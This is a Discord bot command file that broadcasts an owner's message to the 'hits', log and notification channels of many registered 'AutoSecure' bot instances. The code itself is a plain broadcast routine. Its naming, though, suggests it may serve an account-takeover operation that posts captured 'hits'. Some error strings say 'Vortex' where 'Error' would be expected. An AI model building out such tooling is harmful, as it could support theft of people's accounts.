const { queryParams } = require("../../../db/database");
const { autosecureMap } = require("../../handlers/botHandler");
const { owners } = require("../../../config.json");

const delay = (ms) => new Promise(res => setTimeout(res, ms));

module.exports = {
  name: "notify",
  description: "Broadcast a message to all AutoSecure servers",
  options: [
    {
      name: "message",
      description: "Message you want to broadcast",
      type: 3,
      required: true
    }
  ],

  async callback(client, interaction) {
    try {
      /* ================= OWNER CHECK ================= */
      if (!owners || !owners.includes(interaction.user.id)) {
        return interaction.reply({
          content: "❌ You are not authorized to use this command.",
          flags: 64
        });
      }

      const message = interaction.options.getString("message");

      /* ================= INSTANT RESPONSE ================= */
      await interaction.reply({
        content: "📣 **Broadcast Started!**\nSending messages...",
        flags: 64
      });

      const results = await queryParams(
        "SELECT user_id, botnumber, hits_channel, logs_channel, notification_channel FROM autosecure"
      );

      let successCount = 0;
      let failCount = 0;
      let processed = 0;

      for (const result of results) {
        processed++;

        try {
          if (!result.hits_channel?.includes("|")) {
            failCount++;
            continue;
          }

          const [channelId, guildId] = result.hits_channel.split("|");
          const key = `${result.user_id}|${result.botnumber}`;

          const autosecureClient = autosecureMap.get(key);
          if (!autosecureClient) {
            failCount++;
            continue;
          }

          const guild = autosecureClient.guilds.cache.get(guildId);
          if (!guild) {
            failCount++;

            // 🧹 Auto-clean dead guild
            await queryParams(
              "UPDATE autosecure SET hits_channel=NULL WHERE user_id=? AND botnumber=?",
              [result.user_id, result.botnumber]
            );
            continue;
          }

          const channel = guild.channels.cache.get(channelId);
          if (!channel || !channel.isTextBased()) {
            failCount++;

            // 🧹 Auto-clean dead channel
            await queryParams(
              "UPDATE autosecure SET hits_channel=NULL WHERE user_id=? AND botnumber=?",
              [result.user_id, result.botnumber]
            );
            continue;
          }

          await channel.send({ content: message });

          /* =============== LOG CHANNEL =============== */
          if (result.logs_channel?.includes("|")) {
            const [logChId, logGuildId] = result.logs_channel.split("|");
            const logGuild = autosecureClient.guilds.cache.get(logGuildId);
            const logChannel = logGuild?.channels.cache.get(logChId);
            if (logChannel?.isTextBased()) {
              await logChannel.send({ content: message });
            }
          }

          /* =============== NOTIFICATION CHANNEL =============== */
          if (result.notification_channel?.includes("|")) {
            const [notiChId, notiGuildId] = result.notification_channel.split("|");
            const notiGuild = autosecureClient.guilds.cache.get(notiGuildId);
            const notiChannel = notiGuild?.channels.cache.get(notiChId);
            if (notiChannel?.isTextBased()) {
              await notiChannel.send({ content: message });
            }
          }

          successCount++;

        } catch (err) {
          failCount++;
          console.error(
            `[NOTIFY FAIL] ${result.user_id}|${result.botnumber}:`,
            err?.code || err?.message
          );
        }

        /* =============== RATE LIMIT SAFETY =============== */
        if (processed % 5 === 0) {
          await delay(750);
        }

        /* =============== LIVE STATUS UPDATE =============== */
        if (processed % 10 === 0) {
          await interaction.editReply({
            content:
              `📣 **Broadcast Running...**\n\n` +
              `📊 Progress: **${processed}/${results.length}**\n` +
              `✅ Sent: **${successCount}**\n` +
              `❌ Failed: **${failCount}**`,
            flags: 64
          });
        }
      }

      /* ================= FINAL REPORT ================= */
      return interaction.editReply({
        content:
          `📣 **Broadcast Completed!**\n\n` +
          `📊 Total Targets: **${results.length}**\n` +
          `✅ Sent: **${successCount}**\n` +
          `❌ Failed: **${failCount}**`,
        flags: 64
      });

    } catch (error) {
      console.error("Notify command Vortex:", error);
      return interaction.editReply({
        content: "❌ Internal Vortex while sending notifications.",
        flags: 64
      });
    }
  }
};
